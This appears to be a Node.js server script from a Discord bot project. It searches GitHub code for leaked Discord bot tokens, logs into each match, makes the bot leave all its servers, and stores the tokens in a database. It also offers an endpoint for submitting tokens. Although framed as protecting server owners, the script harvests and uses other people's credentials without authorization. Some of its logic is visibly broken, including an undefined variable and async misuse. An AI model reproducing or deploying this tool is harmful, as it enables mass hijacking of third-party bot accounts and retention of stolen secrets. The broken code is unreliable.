const Database = require(`./__Global/Structures/Database`)
const { urlencoded, json } = require(`body-parser`)
const { readdirSync, statSync } = require(`fs`)
const { spawn } = require(`child_process`)
const { Client } = require(`discord.js`)
const { get } = require(`snekfetch`)
const { resolve } = require(`path`)
const express = require(`express`)
const { join } = require(`path`)
const database = new Database()

//
// Start Bots
//

const source = join(`.`, `./src/Bots`)
readdirSync(source).filter(name => statSync(`${source}/${name}`).isDirectory()).forEach(dir => {
	if (!dir.startsWith(`__`)) start(`${source}/${dir}`)
})

function start(input) {
	const proc = spawn(`node`, [[`--expose-gc`], `../../__Global/Main.js`], { cwd: input })
	proc.stdout.on(`data`, data => console.log(String(data)))
	proc.stderr.on(`data`, data => console.error(String(data)))
	proc.on(`close`, () => setTimeout(() => start(input)), process.env.DEV ? 1000 : 1000 * 10)
}

//
// Re-Scan Tokens & Get new ones
//

database.find({ TOKENS: { $type: 2 } }).then(data => {
	const tokens = data[0].TOKENS

	tokens.forEach((token, index) => {
		if (token.toString() === `0`) return
		checkToken(token).catch(() => tokens.splice(index, 1))
	})

	const files = []
	const queries = [
		`require('discord.js')`,
		`discord "bot.run"`,
		`discord "client.run"`,
		`discord "bot.login"`,
		`discord "client.login"`,
		`discord.js "bot.login"`,
		`discord.js "client.login"`,
		`discord.io new client token`,
		`discord token`
	]

	queries.forEach(query => {
		get(`https://api.github.com/search/code?q=${encodeURIComponent(`${query} language:javascript sort:indexed`).replace(/%20/g, `+`)}`)
			.set(`Authorization`, process.env.GITHUB_API)
			.then(data => {
				files.push(...data.body.items.map(item => item.url.split(`?`)[0]).filter(url => !files.includes(url)))
			})
	})

	files.forEach(file => {
		get(file)
			.set(`Authorization`, process.env.GITHUB_API)
			.then(async data => {
				const content = Buffer.from(data.body.content, `base64`).toString(`ascii`)
				await setTimeout(() => null, 1000)
				const tokens = content.match(/M[A-Za-z0-9._-]{58}/g)
				if (tokens) {
					tokens.forEach(token => {
						checkToken(token).then(() => {
							if (tokens.includes(token)) return
							tokens.push(token)
						})
					})
				}
			})
	})

	database.update({ TOKENS: { $type: 2 } }, { TOKENS: tokens })
})

//
// Start API
//

const app = express()

app.get(`/`, (req, res) => res.sendFile(resolve(`__dirname`, `../www/index.html`)))

app.use(urlencoded({ extended: true }))
app.use(json())

const router = express.Router() // eslint-disable-line new-cap

router.post(`/token`, (req, res) => {
	if (!req.body.token) return res.status(422).json({ message: `Please provide token` })
	checkToken(req.body.token, req.body.user).then(() => {
		database.find({ TOKENS: { $type: 2 } }).then(data => {
			const tokens = data[0].TOKENS
			if (tokens.includes(req.body.token)) return
			tokens.push(req.body.token)
			database.update({ TOKENS: { $type: 2 } }, { TOKENS: tokens })
		})
	})
})

app.use(`/api`, router)

app.listen(process.env.PORT || 80)

//
// Heroku Workaround
//

setInterval(() => {
	get(`https://discord-js-bots.herokuapp.com/`).then(() => null)
}, 900000)

//
// Functions
//

function checkToken(token, user) {
	return new Promise((resolve, reject) => {
		const bot = new Client()

		bot.on(`ready`, () => {
			console.log(bot.user.username)
			bot.guilds.forEach(guild => {
				if (user) {
					guild.owner.send(
						`I am leaving \`${guild.name}\`\n` +
						`My token has been leaked, Please don't re-invite me until it has been resolved.\n` +
						`You can thank \`${user}\` for protecting your server. <3`
					).catch(() => null)
				}
				guild.leave().catch(() => null)
			})
			resolve({ USERNAME: bot.user.username, GUILDS: guilds })
			bot.destroy().catch(() => null)
		})

		bot.login(token).catch(error => reject({ error }))
	})
}
